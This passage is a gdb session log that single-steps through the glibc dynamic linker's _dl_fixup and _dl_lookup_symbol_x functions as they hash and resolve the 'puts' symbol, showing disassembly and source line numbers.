   0x7ffff7de6a58 <_dl_fixup+104>:	test   %rax,%rax
0x00007ffff7de6a4b	83	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a51 <_dl_fixup+97>:	mov    0x1c8(%r10),%rax
   0x7ffff7de6a58 <_dl_fixup+104>:	test   %rax,%rax
   0x7ffff7de6a5b <_dl_fixup+107>:	je     0x7ffff7de6b10 <_dl_fixup+288>
87	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a58 <_dl_fixup+104>:	test   %rax,%rax
   0x7ffff7de6a5b <_dl_fixup+107>:	je     0x7ffff7de6b10 <_dl_fixup+288>
   0x7ffff7de6a61 <_dl_fixup+113>:	mov    0x8(%rax),%rax
0x00007ffff7de6a58	87	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a5b <_dl_fixup+107>:	je     0x7ffff7de6b10 <_dl_fixup+288>
   0x7ffff7de6a61 <_dl_fixup+113>:	mov    0x8(%rax),%rax
   0x7ffff7de6a65 <_dl_fixup+117>:	movzwl (%rax,%rdx,2),%eax
0x00007ffff7de6a5b	87	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a61 <_dl_fixup+113>:	mov    0x8(%rax),%rax
   0x7ffff7de6a65 <_dl_fixup+117>:	movzwl (%rax,%rdx,2),%eax
   0x7ffff7de6a69 <_dl_fixup+121>:	and    $0x7fff,%eax
91	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a65 <_dl_fixup+117>:	movzwl (%rax,%rdx,2),%eax
   0x7ffff7de6a69 <_dl_fixup+121>:	and    $0x7fff,%eax
   0x7ffff7de6a6e <_dl_fixup+126>:	lea    (%rax,%rax,2),%rdx
92	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a69 <_dl_fixup+121>:	and    $0x7fff,%eax
   0x7ffff7de6a6e <_dl_fixup+126>:	lea    (%rax,%rax,2),%rdx
   0x7ffff7de6a72 <_dl_fixup+130>:	mov    0x2e0(%r10),%rax
0x00007ffff7de6a69	92	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a6e <_dl_fixup+126>:	lea    (%rax,%rax,2),%rdx
   0x7ffff7de6a72 <_dl_fixup+130>:	mov    0x2e0(%r10),%rax
   0x7ffff7de6a79 <_dl_fixup+137>:	lea    (%rax,%rdx,8),%r8
0x00007ffff7de6a6e	92	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a72 <_dl_fixup+130>:	mov    0x2e0(%r10),%rax
   0x7ffff7de6a79 <_dl_fixup+137>:	lea    (%rax,%rdx,8),%r8
   0x7ffff7de6a7d <_dl_fixup+141>:	mov    $0x0,%eax
0x00007ffff7de6a72	92	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a79 <_dl_fixup+137>:	lea    (%rax,%rdx,8),%r8
   0x7ffff7de6a7d <_dl_fixup+141>:	mov    $0x0,%eax
   0x7ffff7de6a82 <_dl_fixup+146>:	mov    0x8(%r8),%r9d
0x00007ffff7de6a79	92	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a7d <_dl_fixup+141>:	mov    $0x0,%eax
   0x7ffff7de6a82 <_dl_fixup+146>:	mov    0x8(%r8),%r9d
   0x7ffff7de6a86 <_dl_fixup+150>:	test   %r9d,%r9d
94	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a82 <_dl_fixup+146>:	mov    0x8(%r8),%r9d
   0x7ffff7de6a86 <_dl_fixup+150>:	test   %r9d,%r9d
   0x7ffff7de6a89 <_dl_fixup+153>:	cmove  %rax,%r8
0x00007ffff7de6a82	94	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a86 <_dl_fixup+150>:	test   %r9d,%r9d
   0x7ffff7de6a89 <_dl_fixup+153>:	cmove  %rax,%r8
   0x7ffff7de6a8d <_dl_fixup+157>:	mov    %fs:0x18,%eax
0x00007ffff7de6a86	94	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a89 <_dl_fixup+153>:	cmove  %rax,%r8
   0x7ffff7de6a8d <_dl_fixup+157>:	mov    %fs:0x18,%eax
   0x7ffff7de6a95 <_dl_fixup+165>:	test   %eax,%eax
0x00007ffff7de6a89	94	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a8d <_dl_fixup+157>:	mov    %fs:0x18,%eax
   0x7ffff7de6a95 <_dl_fixup+165>:	test   %eax,%eax
   0x7ffff7de6a97 <_dl_fixup+167>:	mov    $0x1,%r9d
101	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a95 <_dl_fixup+165>:	test   %eax,%eax
   0x7ffff7de6a97 <_dl_fixup+167>:	mov    $0x1,%r9d
   0x7ffff7de6a9d <_dl_fixup+173>:	jne    0x7ffff7de6b30 <_dl_fixup+320>
0x00007ffff7de6a95	101	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a97 <_dl_fixup+167>:	mov    $0x1,%r9d
   0x7ffff7de6a9d <_dl_fixup+173>:	jne    0x7ffff7de6b30 <_dl_fixup+320>
   0x7ffff7de6aa3 <_dl_fixup+179>:	mov    (%rsi),%eax
100	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a9d <_dl_fixup+173>:	jne    0x7ffff7de6b30 <_dl_fixup+320>
   0x7ffff7de6aa3 <_dl_fixup+179>:	mov    (%rsi),%eax
   0x7ffff7de6aa5 <_dl_fixup+181>:	mov    0x380(%r10),%rcx
101	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6aa3 <_dl_fixup+179>:	mov    (%rsi),%eax
   0x7ffff7de6aa5 <_dl_fixup+181>:	mov    0x380(%r10),%rcx
   0x7ffff7de6aac <_dl_fixup+188>:	lea    0x8(%rsp),%rdx
111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6aa5 <_dl_fixup+181>:	mov    0x380(%r10),%rcx
   0x7ffff7de6aac <_dl_fixup+188>:	lea    0x8(%rsp),%rdx
   0x7ffff7de6ab1 <_dl_fixup+193>:	pushq  $0x0
0x00007ffff7de6aa5	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6aac <_dl_fixup+188>:	lea    0x8(%rsp),%rdx
   0x7ffff7de6ab1 <_dl_fixup+193>:	pushq  $0x0
   0x7ffff7de6ab3 <_dl_fixup+195>:	push   %r9
0x00007ffff7de6aac	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6ab1 <_dl_fixup+193>:	pushq  $0x0
   0x7ffff7de6ab3 <_dl_fixup+195>:	push   %r9
   0x7ffff7de6ab5 <_dl_fixup+197>:	mov    %r10,%rsi
0x00007ffff7de6ab1	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6ab3 <_dl_fixup+195>:	push   %r9
   0x7ffff7de6ab5 <_dl_fixup+197>:	mov    %r10,%rsi
   0x7ffff7de6ab8 <_dl_fixup+200>:	mov    $0x1,%r9d
0x00007ffff7de6ab3	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6ab5 <_dl_fixup+197>:	mov    %r10,%rsi
   0x7ffff7de6ab8 <_dl_fixup+200>:	mov    $0x1,%r9d
   0x7ffff7de6abe <_dl_fixup+206>:	add    %rax,%rdi
0x00007ffff7de6ab5	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6ab8 <_dl_fixup+200>:	mov    $0x1,%r9d
   0x7ffff7de6abe <_dl_fixup+206>:	add    %rax,%rdi
   0x7ffff7de6ac1 <_dl_fixup+209>:	callq  0x7ffff7de19d0 <_dl_lookup_symbol_x>
0x00007ffff7de6ab8	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6abe <_dl_fixup+206>:	add    %rax,%rdi
   0x7ffff7de6ac1 <_dl_fixup+209>:	callq  0x7ffff7de19d0 <_dl_lookup_symbol_x>
   0x7ffff7de6ac6 <_dl_fixup+214>:	mov    %rax,%r8
0x00007ffff7de6abe	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6ac1 <_dl_fixup+209>:	callq  0x7ffff7de19d0 <_dl_lookup_symbol_x>
   0x7ffff7de6ac6 <_dl_fixup+214>:	mov    %rax,%r8
   0x7ffff7de6ac9 <_dl_fixup+217>:	mov    %fs:0x18,%eax
0x00007ffff7de6ac1	111	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de19d0 <_dl_lookup_symbol_x>:	push   %rbp
   0x7ffff7de19d1 <_dl_lookup_symbol_x+1>:	mov    %rsp,%rbp
   0x7ffff7de19d4 <_dl_lookup_symbol_x+4>:	push   %r15
_dl_lookup_symbol_x (undef_name=0x400569 "puts", undef_map=0x7ffff7ffe168, ref=ref@entry=0x7fffffffdf48, symbol_scope=0x7ffff7ffe4c0, version=0x7ffff7fe4a70, 
    type_class=type_class@entry=1, flags=1, skip_map=0x0) at dl-lookup.c:806
806	dl-lookup.c: No such file or directory.
(gdb) 
=> 0x7ffff7de19d1 <_dl_lookup_symbol_x+1>:	mov    %rsp,%rbp
   0x7ffff7de19d4 <_dl_lookup_symbol_x+4>:	push   %r15
   0x7ffff7de19d6 <_dl_lookup_symbol_x+6>:	push   %r14
0x00007ffff7de19d1	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19d4 <_dl_lookup_symbol_x+4>:	push   %r15
   0x7ffff7de19d6 <_dl_lookup_symbol_x+6>:	push   %r14
   0x7ffff7de19d8 <_dl_lookup_symbol_x+8>:	push   %r13
0x00007ffff7de19d4	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19d6 <_dl_lookup_symbol_x+6>:	push   %r14
   0x7ffff7de19d8 <_dl_lookup_symbol_x+8>:	push   %r13
   0x7ffff7de19da <_dl_lookup_symbol_x+10>:	push   %r12
0x00007ffff7de19d6	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19d8 <_dl_lookup_symbol_x+8>:	push   %r13
   0x7ffff7de19da <_dl_lookup_symbol_x+10>:	push   %r12
   0x7ffff7de19dc <_dl_lookup_symbol_x+12>:	mov    %rdx,%r15
0x00007ffff7de19d8	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19da <_dl_lookup_symbol_x+10>:	push   %r12
   0x7ffff7de19dc <_dl_lookup_symbol_x+12>:	mov    %rdx,%r15
   0x7ffff7de19df <_dl_lookup_symbol_x+15>:	push   %rbx
0x00007ffff7de19da	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19dc <_dl_lookup_symbol_x+12>:	mov    %rdx,%r15
   0x7ffff7de19df <_dl_lookup_symbol_x+15>:	push   %rbx
   0x7ffff7de19e0 <_dl_lookup_symbol_x+16>:	mov    %rsi,%r14
0x00007ffff7de19dc	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19df <_dl_lookup_symbol_x+15>:	push   %rbx
   0x7ffff7de19e0 <_dl_lookup_symbol_x+16>:	mov    %rsi,%r14
   0x7ffff7de19e3 <_dl_lookup_symbol_x+19>:	mov    %r8,%r12
0x00007ffff7de19df	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19e0 <_dl_lookup_symbol_x+16>:	mov    %rsi,%r14
   0x7ffff7de19e3 <_dl_lookup_symbol_x+19>:	mov    %r8,%r12
   0x7ffff7de19e6 <_dl_lookup_symbol_x+22>:	sub    $0xc8,%rsp
0x00007ffff7de19e0	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19e3 <_dl_lookup_symbol_x+19>:	mov    %r8,%r12
   0x7ffff7de19e6 <_dl_lookup_symbol_x+22>:	sub    $0xc8,%rsp
   0x7ffff7de19ed <_dl_lookup_symbol_x+29>:	movzbl (%rdi),%edx
0x00007ffff7de19e3	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19e6 <_dl_lookup_symbol_x+22>:	sub    $0xc8,%rsp
   0x7ffff7de19ed <_dl_lookup_symbol_x+29>:	movzbl (%rdi),%edx
   0x7ffff7de19f0 <_dl_lookup_symbol_x+32>:	mov    %rdi,-0xa8(%rbp)
0x00007ffff7de19e6	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19ed <_dl_lookup_symbol_x+29>:	movzbl (%rdi),%edx
   0x7ffff7de19f0 <_dl_lookup_symbol_x+32>:	mov    %rdi,-0xa8(%rbp)
   0x7ffff7de19f7 <_dl_lookup_symbol_x+39>:	mov    %rcx,-0xd0(%rbp)
dl_new_hash (s=0x400569 "puts") at dl-lookup.c:568
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19f0 <_dl_lookup_symbol_x+32>:	mov    %rdi,-0xa8(%rbp)
   0x7ffff7de19f7 <_dl_lookup_symbol_x+39>:	mov    %rcx,-0xd0(%rbp)
   0x7ffff7de19fe <_dl_lookup_symbol_x+46>:	mov    %r9d,-0xbc(%rbp)
_dl_lookup_symbol_x (undef_name=0x400569 "puts", undef_map=0x7ffff7ffe168, ref=ref@entry=0x7fffffffdf48, symbol_scope=0x7ffff7ffe4c0, version=0x7ffff7fe4a70, 
    type_class=type_class@entry=1, flags=1, skip_map=0x0) at dl-lookup.c:806
806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19f7 <_dl_lookup_symbol_x+39>:	mov    %rcx,-0xd0(%rbp)
   0x7ffff7de19fe <_dl_lookup_symbol_x+46>:	mov    %r9d,-0xbc(%rbp)
   0x7ffff7de1a05 <_dl_lookup_symbol_x+53>:	mov    0x18(%rbp),%r13
0x00007ffff7de19f7	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de19fe <_dl_lookup_symbol_x+46>:	mov    %r9d,-0xbc(%rbp)
   0x7ffff7de1a05 <_dl_lookup_symbol_x+53>:	mov    0x18(%rbp),%r13
   0x7ffff7de1a09 <_dl_lookup_symbol_x+57>:	test   %dl,%dl
0x00007ffff7de19fe	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a05 <_dl_lookup_symbol_x+53>:	mov    0x18(%rbp),%r13
   0x7ffff7de1a09 <_dl_lookup_symbol_x+57>:	test   %dl,%dl
   0x7ffff7de1a0b <_dl_lookup_symbol_x+59>:	je     0x7ffff7de1d00 <_dl_lookup_symbol_x+816>
0x00007ffff7de1a05	806	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a09 <_dl_lookup_symbol_x+57>:	test   %dl,%dl
   0x7ffff7de1a0b <_dl_lookup_symbol_x+59>:	je     0x7ffff7de1d00 <_dl_lookup_symbol_x+816>
   0x7ffff7de1a11 <_dl_lookup_symbol_x+65>:	mov    %rdi,%rcx
dl_new_hash (s=0x400569 "puts") at dl-lookup.c:568
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a0b <_dl_lookup_symbol_x+59>:	je     0x7ffff7de1d00 <_dl_lookup_symbol_x+816>
   0x7ffff7de1a11 <_dl_lookup_symbol_x+65>:	mov    %rdi,%rcx
   0x7ffff7de1a14 <_dl_lookup_symbol_x+68>:	mov    $0x1505,%eax
0x00007ffff7de1a0b	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a11 <_dl_lookup_symbol_x+65>:	mov    %rdi,%rcx
   0x7ffff7de1a14 <_dl_lookup_symbol_x+68>:	mov    $0x1505,%eax
   0x7ffff7de1a19 <_dl_lookup_symbol_x+73>:	nopl   0x0(%rax)
0x00007ffff7de1a11	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a14 <_dl_lookup_symbol_x+68>:	mov    $0x1505,%eax
   0x7ffff7de1a19 <_dl_lookup_symbol_x+73>:	nopl   0x0(%rax)
   0x7ffff7de1a20 <_dl_lookup_symbol_x+80>:	mov    %rax,%rsi
0x00007ffff7de1a14	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a19 <_dl_lookup_symbol_x+73>:	nopl   0x0(%rax)
   0x7ffff7de1a20 <_dl_lookup_symbol_x+80>:	mov    %rax,%rsi
   0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
0x00007ffff7de1a19	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a20 <_dl_lookup_symbol_x+80>:	mov    %rax,%rsi
   0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
0x00007ffff7de1a2b	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
0x00007ffff7de1a2e	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
0x00007ffff7de1a34	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
   0x7ffff7de1a3a <_dl_lookup_symbol_x+106>:	mov    %rax,-0xb0(%rbp)
0x00007ffff7de1a36	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a20 <_dl_lookup_symbol_x+80>:	mov    %rax,%rsi
   0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
0x00007ffff7de1a2b	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
0x00007ffff7de1a2e	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
0x00007ffff7de1a34	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
   0x7ffff7de1a3a <_dl_lookup_symbol_x+106>:	mov    %rax,-0xb0(%rbp)
0x00007ffff7de1a36	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a20 <_dl_lookup_symbol_x+80>:	mov    %rax,%rsi
   0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
0x00007ffff7de1a2b	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
0x00007ffff7de1a2e	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
0x00007ffff7de1a34	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
   0x7ffff7de1a3a <_dl_lookup_symbol_x+106>:	mov    %rax,-0xb0(%rbp)
0x00007ffff7de1a36	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a20 <_dl_lookup_symbol_x+80>:	mov    %rax,%rsi
   0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a23 <_dl_lookup_symbol_x+83>:	add    $0x1,%rcx
   0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a27 <_dl_lookup_symbol_x+87>:	shl    $0x5,%rsi
   0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2b <_dl_lookup_symbol_x+91>:	add    %rsi,%rax
   0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
0x00007ffff7de1a2b	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a2e <_dl_lookup_symbol_x+94>:	add    %rdx,%rax
   0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
0x00007ffff7de1a2e	569	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a31 <_dl_lookup_symbol_x+97>:	movzbl (%rcx),%edx
   0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a34 <_dl_lookup_symbol_x+100>:	test   %dl,%dl
   0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
0x00007ffff7de1a34	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a36 <_dl_lookup_symbol_x+102>:	jne    0x7ffff7de1a20 <_dl_lookup_symbol_x+80>
   0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
   0x7ffff7de1a3a <_dl_lookup_symbol_x+106>:	mov    %rax,-0xb0(%rbp)
0x00007ffff7de1a36	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a38 <_dl_lookup_symbol_x+104>:	mov    %eax,%eax
   0x7ffff7de1a3a <_dl_lookup_symbol_x+106>:	mov    %rax,-0xb0(%rbp)
   0x7ffff7de1a41 <_dl_lookup_symbol_x+113>:	mov    $0xffffffff,%eax
0x00007ffff7de1a38	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a3a <_dl_lookup_symbol_x+106>:	mov    %rax,-0xb0(%rbp)
   0x7ffff7de1a41 <_dl_lookup_symbol_x+113>:	mov    $0xffffffff,%eax
   0x7ffff7de1a46 <_dl_lookup_symbol_x+118>:	addq   $0x1,0x21bf6a(%rip)        # 0x7ffff7ffd9b8 <_rtld_global+2424>
0x00007ffff7de1a3a	568	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a41 <_dl_lookup_symbol_x+113>:	mov    $0xffffffff,%eax
   0x7ffff7de1a46 <_dl_lookup_symbol_x+118>:	addq   $0x1,0x21bf6a(%rip)        # 0x7ffff7ffd9b8 <_rtld_global+2424>
   0x7ffff7de1a4e <_dl_lookup_symbol_x+126>:	test   %r12,%r12
_dl_lookup_symbol_x (undef_name=0x400569 "puts", undef_map=0x7ffff7ffe168, ref=ref@entry=0x7fffffffdf48, symbol_scope=0x7ffff7ffe4c0, version=0x7ffff7fe4a70, 
    type_class=type_class@entry=1, flags=1, skip_map=0x0) at dl-lookup.c:808
808	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a46 <_dl_lookup_symbol_x+118>:	addq   $0x1,0x21bf6a(%rip)        # 0x7ffff7ffd9b8 <_rtld_global+2424>
   0x7ffff7de1a4e <_dl_lookup_symbol_x+126>:	test   %r12,%r12
   0x7ffff7de1a51 <_dl_lookup_symbol_x+129>:	mov    %rax,-0xa0(%rbp)
812	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a4e <_dl_lookup_symbol_x+126>:	test   %r12,%r12
   0x7ffff7de1a51 <_dl_lookup_symbol_x+129>:	mov    %rax,-0xa0(%rbp)
   0x7ffff7de1a58 <_dl_lookup_symbol_x+136>:	movq   $0x0,-0x90(%rbp)
816	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a51 <_dl_lookup_symbol_x+129>:	mov    %rax,-0xa0(%rbp)
   0x7ffff7de1a58 <_dl_lookup_symbol_x+136>:	movq   $0x0,-0x90(%rbp)
   0x7ffff7de1a63 <_dl_lookup_symbol_x+147>:	movq   $0x0,-0x88(%rbp)
808	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a58 <_dl_lookup_symbol_x+136>:	movq   $0x0,-0x90(%rbp)
   0x7ffff7de1a63 <_dl_lookup_symbol_x+147>:	movq   $0x0,-0x88(%rbp)
   0x7ffff7de1a6e <_dl_lookup_symbol_x+158>:	je     0x7ffff7de1a7d <_dl_lookup_symbol_x+173>
809	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a63 <_dl_lookup_symbol_x+147>:	movq   $0x0,-0x88(%rbp)
   0x7ffff7de1a6e <_dl_lookup_symbol_x+158>:	je     0x7ffff7de1a7d <_dl_lookup_symbol_x+173>
